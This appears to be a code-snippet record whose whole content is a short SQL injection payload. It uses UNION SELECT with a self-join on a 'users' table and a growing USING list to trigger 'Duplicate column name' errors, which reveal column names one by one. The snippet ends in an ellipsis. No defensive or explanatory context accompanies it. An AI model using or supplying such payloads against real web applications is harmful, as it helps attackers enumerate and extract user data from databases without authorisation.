---
id: 0c56c07a-345a-459e-b267-a9f7d8387642
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.392918+00:00'
updated_at: '2023-04-10T20:22:52.412674+00:00'
---

# Code Snippet 0c56c07a

**Language**: SQL

```sql
-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a
-- #1060 - Duplicate column name 'name'

-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a
...
```


